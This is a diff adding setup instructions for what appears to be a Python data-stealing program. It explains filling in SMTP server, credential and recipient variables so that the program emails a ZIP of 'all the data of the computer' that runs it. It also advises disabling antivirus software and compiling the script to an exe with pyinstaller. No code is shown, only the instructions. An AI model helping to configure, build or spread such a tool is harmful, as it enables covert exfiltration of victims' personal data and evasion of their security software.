@@ -1,0 +1,14 @@
+Before running the code, please set up the mail sending function.
+  
+      "function "send_email(zip_path)"  designed to send a ZIP archive via email. It takes the path to the ZIP archive "(zip_path)" as an argument and sends this archive as an               attachment to the specified email address using the SMTP protocol."
+
+      Before using the function, you need to define the following global variables:
+      1.SMTP_SERVER: The address of your SMTP server (e.g., "smtp.gmail.com", "smtp.yandex.ru");
+      2.SMTP_PORT: The SMTP server port (e.g., 587 for STARTTLS);
+      3.SMTP_USERNAME: Your login for the mail server (usually your email address);
+      4.SMTP_PASSWORD: Your email account password;
+      5.SENDER_EMAIL: The sender’s email address (your email address);
+      6.RECEIVER_EMAIL: The recipient’s email address.
+        
+        "If configured correctly, the code will be executed and send a zip archive with all the data of the computer that launched the code or exe file, directly to the recipient's           email address that you specified."
+        "Attention: I strongly recommend disabling all antivirus software before running or saving this code.The code is written in Python 3.14.0. If you wish, you can use pyinstaller to compile the code into an exe file."
